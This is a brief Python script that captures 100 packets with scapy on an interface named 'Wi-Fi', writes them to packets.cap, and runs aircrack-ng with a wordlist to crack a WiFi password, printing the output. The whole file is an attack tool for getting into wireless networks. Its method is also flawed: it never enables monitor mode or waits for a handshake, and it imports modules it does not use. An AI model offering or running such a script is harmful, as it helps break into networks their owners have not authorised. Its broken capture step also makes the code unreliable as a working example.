import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Auth
from subprocess import Popen, PIPE

# Capture WiFi packets
interface_name = "Wi-Fi"
packets = scapy.sniff(iface=interface_name, count=100)

# Save packets to file
scapy.wrpcap("packets.cap", packets)

# Use Aircrack-ng to crack password
process = Popen(["aircrack-ng", "-w", "wordlist.txt", "packets.cap"], stdout=PIPE)
output, error = process.communicate()

# Print cracked password
print(output.decode("utf-8"))
